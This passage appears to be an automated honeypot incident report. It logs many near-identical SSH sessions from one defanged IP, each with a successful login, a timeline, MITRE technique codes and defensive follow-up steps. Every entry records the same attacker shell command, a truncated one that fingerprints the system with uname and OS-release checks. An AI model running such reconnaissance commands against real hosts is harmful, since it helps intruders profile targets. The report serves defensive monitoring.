| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:20:09` | `cowrie.session.connect` |
| `2026-08-12 02:20:10` | `cowrie.client.version` |
| `2026-08-12 02:20:10` | `cowrie.client.kex` |
| `2026-08-12 02:20:10` | `cowrie.login.success` |
| `2026-08-12 02:20:11` | `cowrie.session.params` |
| `2026-08-12 02:20:11` | `cowrie.command.input` |
| `2026-08-12 02:20:11` | `cowrie.command.input` |
| `2026-08-12 02:20:11` | `cowrie.command.input` |
| `2026-08-12 02:20:11` | `cowrie.command.input` |
| `2026-08-12 02:20:11` | `cowrie.command.input` |
| `2026-08-12 02:20:11` | `cowrie.command.success` |
| `2026-08-12 02:20:11` | `cowrie.command.input` |
| `2026-08-12 02:20:11` | `cowrie.command.input` |
| `2026-08-12 02:20:11` | `cowrie.command.input` |
| `2026-08-12 02:20:11` | `cowrie.command.input` |
| `2026-08-12 02:20:11` | `cowrie.log.closed` |
| `2026-08-12 02:20:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7ea91ac5d47

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:21 |
| **Last Seen** | 2026-08-12 02:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:21:09` | `cowrie.session.connect` |
| `2026-08-12 02:21:09` | `cowrie.client.version` |
| `2026-08-12 02:21:09` | `cowrie.client.kex` |
| `2026-08-12 02:21:09` | `cowrie.login.success` |
| `2026-08-12 02:21:10` | `cowrie.session.params` |
| `2026-08-12 02:21:10` | `cowrie.command.input` |
| `2026-08-12 02:21:10` | `cowrie.command.input` |
| `2026-08-12 02:21:10` | `cowrie.command.input` |
| `2026-08-12 02:21:10` | `cowrie.command.input` |
| `2026-08-12 02:21:10` | `cowrie.command.input` |
| `2026-08-12 02:21:10` | `cowrie.command.success` |
| `2026-08-12 02:21:10` | `cowrie.command.input` |
| `2026-08-12 02:21:10` | `cowrie.command.input` |
| `2026-08-12 02:21:10` | `cowrie.command.input` |
| `2026-08-12 02:21:10` | `cowrie.command.input` |
| `2026-08-12 02:21:10` | `cowrie.log.closed` |
| `2026-08-12 02:21:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25302903bee5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:22 |
| **Last Seen** | 2026-08-12 02:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:22:07` | `cowrie.session.connect` |
| `2026-08-12 02:22:07` | `cowrie.client.version` |
| `2026-08-12 02:22:07` | `cowrie.client.kex` |
| `2026-08-12 02:22:08` | `cowrie.login.success` |
| `2026-08-12 02:22:09` | `cowrie.session.params` |
| `2026-08-12 02:22:09` | `cowrie.command.input` |
| `2026-08-12 02:22:09` | `cowrie.command.input` |
| `2026-08-12 02:22:09` | `cowrie.command.input` |
| `2026-08-12 02:22:09` | `cowrie.command.input` |
| `2026-08-12 02:22:09` | `cowrie.command.input` |
| `2026-08-12 02:22:09` | `cowrie.command.success` |
| `2026-08-12 02:22:09` | `cowrie.command.input` |
| `2026-08-12 02:22:09` | `cowrie.command.input` |
| `2026-08-12 02:22:09` | `cowrie.command.input` |
| `2026-08-12 02:22:09` | `cowrie.command.input` |
| `2026-08-12 02:22:09` | `cowrie.log.closed` |
| `2026-08-12 02:22:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ce06fc3e219

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:23 |
| **Last Seen** | 2026-08-12 02:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:23:00` | `cowrie.session.connect` |
| `2026-08-12 02:23:00` | `cowrie.client.version` |
| `2026-08-12 02:23:00` | `cowrie.client.kex` |
| `2026-08-12 02:23:00` | `cowrie.login.success` |
| `2026-08-12 02:23:01` | `cowrie.session.params` |
| `2026-08-12 02:23:01` | `cowrie.command.input` |
| `2026-08-12 02:23:01` | `cowrie.command.input` |
| `2026-08-12 02:23:01` | `cowrie.command.input` |
| `2026-08-12 02:23:01` | `cowrie.command.input` |
| `2026-08-12 02:23:01` | `cowrie.command.input` |
| `2026-08-12 02:23:01` | `cowrie.command.success` |
| `2026-08-12 02:23:01` | `cowrie.command.input` |
| `2026-08-12 02:23:01` | `cowrie.command.input` |
| `2026-08-12 02:23:01` | `cowrie.command.input` |
| `2026-08-12 02:23:01` | `cowrie.command.input` |
| `2026-08-12 02:23:01` | `cowrie.log.closed` |
| `2026-08-12 02:23:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46c314557e7f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:23 |
| **Last Seen** | 2026-08-12 02:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:23:52` | `cowrie.session.connect` |
| `2026-08-12 02:23:52` | `cowrie.client.version` |
| `2026-08-12 02:23:52` | `cowrie.client.kex` |
| `2026-08-12 02:23:53` | `cowrie.login.success` |
| `2026-08-12 02:23:54` | `cowrie.session.params` |
| `2026-08-12 02:23:54` | `cowrie.command.input` |
| `2026-08-12 02:23:54` | `cowrie.command.input` |
| `2026-08-12 02:23:54` | `cowrie.command.input` |
| `2026-08-12 02:23:54` | `cowrie.command.input` |
| `2026-08-12 02:23:54` | `cowrie.command.input` |
| `2026-08-12 02:23:54` | `cowrie.command.success` |
| `2026-08-12 02:23:54` | `cowrie.command.input` |
| `2026-08-12 02:23:54` | `cowrie.command.input` |
| `2026-08-12 02:23:54` | `cowrie.command.input` |
| `2026-08-12 02:23:54` | `cowrie.command.input` |
| `2026-08-12 02:23:54` | `cowrie.log.closed` |
| `2026-08-12 02:23:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-512be1d1a7a0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:24 |
| **Last Seen** | 2026-08-12 02:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:24:48` | `cowrie.session.connect` |
| `2026-08-12 02:24:48` | `cowrie.client.version` |
| `2026-08-12 02:24:48` | `cowrie.client.kex` |
| `2026-08-12 02:24:49` | `cowrie.login.success` |
| `2026-08-12 02:24:50` | `cowrie.session.params` |
| `2026-08-12 02:24:50` | `cowrie.command.input` |
| `2026-08-12 02:24:50` | `cowrie.command.input` |
| `2026-08-12 02:24:50` | `cowrie.command.input` |
| `2026-08-12 02:24:50` | `cowrie.command.input` |
| `2026-08-12 02:24:50` | `cowrie.command.input` |
| `2026-08-12 02:24:50` | `cowrie.command.success` |
| `2026-08-12 02:24:50` | `cowrie.command.input` |
| `2026-08-12 02:24:50` | `cowrie.command.input` |
| `2026-08-12 02:24:50` | `cowrie.command.input` |
| `2026-08-12 02:24:50` | `cowrie.command.input` |
| `2026-08-12 02:24:50` | `cowrie.log.closed` |
| `2026-08-12 02:24:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43f50ffc26b4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:25 |
| **Last Seen** | 2026-08-12 02:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:25:52` | `cowrie.session.connect` |
| `2026-08-12 02:25:52` | `cowrie.client.version` |
| `2026-08-12 02:25:52` | `cowrie.client.kex` |
| `2026-08-12 02:25:53` | `cowrie.login.success` |
| `2026-08-12 02:25:54` | `cowrie.session.params` |
| `2026-08-12 02:25:54` | `cowrie.command.input` |
| `2026-08-12 02:25:54` | `cowrie.command.input` |
| `2026-08-12 02:25:54` | `cowrie.command.input` |
| `2026-08-12 02:25:54` | `cowrie.command.input` |
| `2026-08-12 02:25:54` | `cowrie.command.input` |
| `2026-08-12 02:25:54` | `cowrie.command.success` |
| `2026-08-12 02:25:54` | `cowrie.command.input` |
| `2026-08-12 02:25:54` | `cowrie.command.input` |
| `2026-08-12 02:25:54` | `cowrie.command.input` |
| `2026-08-12 02:25:54` | `cowrie.command.input` |
| `2026-08-12 02:25:54` | `cowrie.log.closed` |
| `2026-08-12 02:25:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-602a5b3bf673

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:27 |
| **Last Seen** | 2026-08-12 02:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:27:04` | `cowrie.session.connect` |
| `2026-08-12 02:27:04` | `cowrie.client.version` |
| `2026-08-12 02:27:04` | `cowrie.client.kex` |
| `2026-08-12 02:27:05` | `cowrie.login.success` |
| `2026-08-12 02:27:05` | `cowrie.session.params` |
| `2026-08-12 02:27:05` | `cowrie.command.input` |
| `2026-08-12 02:27:05` | `cowrie.command.input` |
| `2026-08-12 02:27:05` | `cowrie.command.input` |
| `2026-08-12 02:27:05` | `cowrie.command.input` |
| `2026-08-12 02:27:05` | `cowrie.command.input` |
| `2026-08-12 02:27:05` | `cowrie.command.success` |
| `2026-08-12 02:27:05` | `cowrie.command.input` |
| `2026-08-12 02:27:05` | `cowrie.command.input` |
| `2026-08-12 02:27:05` | `cowrie.command.input` |
| `2026-08-12 02:27:05` | `cowrie.command.input` |
| `2026-08-12 02:27:06` | `cowrie.log.closed` |
| `2026-08-12 02:27:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-731b9db11f0b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:28 |
| **Last Seen** | 2026-08-12 02:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:28:01` | `cowrie.session.connect` |
| `2026-08-12 02:28:01` | `cowrie.client.version` |
| `2026-08-12 02:28:01` | `cowrie.client.kex` |
| `2026-08-12 02:28:01` | `cowrie.login.success` |
| `2026-08-12 02:28:02` | `cowrie.session.params` |
| `2026-08-12 02:28:02` | `cowrie.command.input` |
| `2026-08-12 02:28:02` | `cowrie.command.input` |
| `2026-08-12 02:28:02` | `cowrie.command.input` |
| `2026-08-12 02:28:02` | `cowrie.command.input` |
| `2026-08-12 02:28:02` | `cowrie.command.input` |
| `2026-08-12 02:28:02` | `cowrie.command.success` |
| `2026-08-12 02:28:02` | `cowrie.command.input` |
| `2026-08-12 02:28:02` | `cowrie.command.input` |
| `2026-08-12 02:28:02` | `cowrie.command.input` |
| `2026-08-12 02:28:02` | `cowrie.command.input` |
| `2026-08-12 02:28:03` | `cowrie.log.closed` |
| `2026-08-12 02:28:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9baaffde412a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:28 |
| **Last Seen** | 2026-08-12 02:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:28:54` | `cowrie.session.connect` |
| `2026-08-12 02:28:55` | `cowrie.client.version` |
| `2026-08-12 02:28:55` | `cowrie.client.kex` |
| `2026-08-12 02:28:55` | `cowrie.login.success` |
| `2026-08-12 02:28:56` | `cowrie.session.params` |
| `2026-08-12 02:28:56` | `cowrie.command.input` |
| `2026-08-12 02:28:56` | `cowrie.command.input` |
| `2026-08-12 02:28:56` | `cowrie.command.input` |
| `2026-08-12 02:28:56` | `cowrie.command.input` |
| `2026-08-12 02:28:56` | `cowrie.command.input` |
| `2026-08-12 02:28:56` | `cowrie.command.success` |
| `2026-08-12 02:28:56` | `cowrie.command.input` |
| `2026-08-12 02:28:56` | `cowrie.command.input` |
| `2026-08-12 02:28:56` | `cowrie.command.input` |
| `2026-08-12 02:28:56` | `cowrie.command.input` |
| `2026-08-12 02:28:56` | `cowrie.log.closed` |
| `2026-08-12 02:28:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11300f0ed463

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:29 |
| **Last Seen** | 2026-08-12 02:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:29:45` | `cowrie.session.connect` |
| `2026-08-12 02:29:45` | `cowrie.client.version` |
| `2026-08-12 02:29:46` | `cowrie.client.kex` |
| `2026-08-12 02:29:46` | `cowrie.login.success` |
| `2026-08-12 02:29:47` | `cowrie.session.params` |
| `2026-08-12 02:29:47` | `cowrie.command.input` |
| `2026-08-12 02:29:47` | `cowrie.command.input` |
| `2026-08-12 02:29:47` | `cowrie.command.input` |
| `2026-08-12 02:29:47` | `cowrie.command.input` |
| `2026-08-12 02:29:47` | `cowrie.command.input` |
| `2026-08-12 02:29:47` | `cowrie.command.success` |
| `2026-08-12 02:29:47` | `cowrie.command.input` |
| `2026-08-12 02:29:47` | `cowrie.command.input` |
| `2026-08-12 02:29:47` | `cowrie.command.input` |
| `2026-08-12 02:29:47` | `cowrie.command.input` |
| `2026-08-12 02:29:47` | `cowrie.log.closed` |
| `2026-08-12 02:29:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-788374a252b6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:30 |
| **Last Seen** | 2026-08-12 02:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:30:38` | `cowrie.session.connect` |
| `2026-08-12 02:30:38` | `cowrie.client.version` |
| `2026-08-12 02:30:38` | `cowrie.client.kex` |
| `2026-08-12 02:30:38` | `cowrie.login.success` |
| `2026-08-12 02:30:39` | `cowrie.session.params` |
| `2026-08-12 02:30:39` | `cowrie.command.input` |
| `2026-08-12 02:30:39` | `cowrie.command.input` |
| `2026-08-12 02:30:39` | `cowrie.command.input` |
| `2026-08-12 02:30:39` | `cowrie.command.input` |
| `2026-08-12 02:30:39` | `cowrie.command.input` |
| `2026-08-12 02:30:39` | `cowrie.command.success` |
| `2026-08-12 02:30:39` | `cowrie.command.input` |
| `2026-08-12 02:30:39` | `cowrie.command.input` |
| `2026-08-12 02:30:39` | `cowrie.command.input` |
| `2026-08-12 02:30:39` | `cowrie.command.input` |
| `2026-08-12 02:30:41` | `cowrie.log.closed` |
| `2026-08-12 02:30:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4e974b0cad1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:31 |
| **Last Seen** | 2026-08-12 02:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
